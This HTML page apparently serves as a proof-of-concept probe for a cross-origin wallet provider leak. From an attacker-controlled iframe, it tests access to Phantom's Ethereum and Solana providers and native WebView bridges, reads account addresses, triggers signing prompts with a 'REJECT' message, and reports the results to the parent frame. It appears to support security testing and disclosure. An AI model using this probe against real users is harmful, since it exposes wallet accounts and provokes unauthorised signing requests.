<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Origin B — cross-origin probe</title>
</head>
<body>
<p>Origin B (cross-origin). Controlled by the attacker.</p>
<script>
'use strict';
const aOrigin = new URLSearchParams(location.search).get('a');
if(!aOrigin){ document.body.append('missing ?a=<victimOrigin>'); throw new Error('no a'); }
const toA = d => parent.postMessage(Object.assign({}, d), aOrigin);
const isSub = self !== top;

const evm = () => window.phantom?.ethereum || (window.ethereum?.isPhantom ? window.ethereum : null);
const sol = () => window.phantom?.solana || (window.solana?.isPhantom ? window.solana : null);
const rnwv = () => window.ReactNativeWebView;
const wk = () => window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.ReactNativeWebView;
const hex = s => '0x' + [...new TextEncoder().encode(s)].map(x=>x.toString(16).padStart(2,'0')).join('');

function surface(){
  return {
    phantom_ethereum: !!window.phantom?.ethereum,
    ethereum_isPhantom: !!window.ethereum?.isPhantom,
    phantom_solana: !!window.phantom?.solana,
    solana_isPhantom: !!window.solana?.isPhantom,
    rnwv_postMessage: typeof rnwv()?.postMessage === 'function',
    wk_handler: !!wk(),
    isSubframe: isSub
  };
}
function summarize(s){
  const on = Object.entries(s).filter(([k,v])=>v && k!=='isSubframe').map(([k])=>k);
  return on.length ? on.join(', ') : 'none';
}

addEventListener('message', async e => {
  if(e.source !== parent || e.origin !== aOrigin) return;
  const { cmd, account } = e.data || {};
  try{
    if(cmd === 'SURFACE'){
      const s = surface();
      const providerLeaked = s.phantom_ethereum || s.ethereum_isPhantom || s.phantom_solana || s.solana_isPhantom;
      toA({ type:'RESULT', probe:'SURFACE', summary: summarize(s), detail: s, danger: providerLeaked });
      return;
    }
    if(cmd === 'EVM'){
      const p = evm();
      if(!p){ toA({ type:'RESULT', probe:'EVM', reason:'no EVM provider in B', detail:{} }); return; }
      let obtainedAccount = '', detail = {};
      try{ const accts = await p.request({ method:'eth_accounts', params:[] });
        detail.eth_accounts = accts;
        if((accts||[]).some(a => a.toLowerCase() === (account||'').toLowerCase())) obtainedAccount = account;
      }catch(err){ detail.eth_accounts_err = err.message; }
      try{ detail.chainId = await p.request({ method:'eth_chainId' }); }catch{}
      toA({ type:'RESULT', probe:'EVM', obtainedAccount, reachedPrompt:false, detail });
      (async()=>{ try{ const msg = 'CROSS-ORIGIN from ' + location.origin + ' as A. REJECT.';
          await p.request({ method:'personal_sign', params:[hex(msg), account] });
          toA({ type:'RESULT', probe:'EVM', obtainedAccount, reachedPrompt:true, detail:{ sign:'prompt reached' } });
        }catch(err){ toA({ type:'RESULT', probe:'EVM', obtainedAccount, reachedPrompt: err.code===4001, detail:{ personal_sign_err:{ code:err.code, message:err.message } } }); } })();
      return;
    }
    if(cmd === 'SOL'){
      const p = sol();
      if(!p){ toA({ type:'RESULT', probe:'SOL', reason:'no Solana provider in B', detail:{} }); return; }
      let obtainedAccount = '', detail = {};
      detail.isConnected = !!p.isConnected;
      detail.publicKey = p.publicKey?.toString() || null;
      if(detail.publicKey && detail.publicKey === account) obtainedAccount = account;
      try{ const r = await p.connect({ onlyIfTrusted:true });
        detail.connect_onlyIfTrusted = r?.publicKey?.toString() || p.publicKey?.toString() || null;
        if(detail.connect_onlyIfTrusted && detail.connect_onlyIfTrusted === account) obtainedAccount = account;
      }catch(err){ detail.connect_onlyIfTrusted_err = err.message; }
      toA({ type:'RESULT', probe:'SOL', obtainedAccount, reachedPrompt:false, detail });
      (async()=>{ try{ const enc = new TextEncoder().encode('CROSS-ORIGIN from ' + location.origin + ' as A. REJECT.');
          await p.signMessage(enc, 'utf8');
          toA({ type:'RESULT', probe:'SOL', obtainedAccount, reachedPrompt:true, detail:{ sign:'prompt reached' } });
        }catch(err){ toA({ type:'RESULT', probe:'SOL', obtainedAccount, reachedPrompt:(err.code===4001)||/reject/i.test(err.message||''), detail:{ signMessage_err:{ code:err.code, message:err.message } } }); } })();
      return;
    }
    if(cmd === 'RAW'){
      const reach = { rnwv_postMessage: typeof rnwv()?.postMessage === 'function', wk_handler: !!wk() };
      const sent = {};
      const envelope = JSON.stringify({ __xorigin_probe:true, from: location.origin, claimOrigin: aOrigin, ts: Date.now() });
      try{ if(reach.rnwv_postMessage){ rnwv().postMessage(envelope); sent.rnwv = true; } }catch(err){ sent.rnwv_err = err.message; }
      try{ if(reach.wk_handler){ wk().postMessage(envelope); sent.wk = true; } }catch(err){ sent.wk_err = err.message; }
      const danger = reach.rnwv_postMessage || reach.wk_handler;
      const summary = 'reachable=' + JSON.stringify(reach) + ' sent=' + JSON.stringify(sent);
      toA({ type:'RESULT', probe:'RAW', summary, danger, detail:{ reach, sent } });
      return;
    }
  }catch(err){
    toA({ type:'RESULT', probe: cmd || 'unknown', detail:{ fatal: err.message } });
  }
});

const s = surface();
toA({ type:'READY', actualOrigin: location.origin, isSubframe: isSub, surface: s,
      surfaceShort: summarize(s), hasAny: s.rnwv_postMessage || s.wk_handler || s.phantom_ethereum || s.phantom_solana });
</script>
</body>
</html>
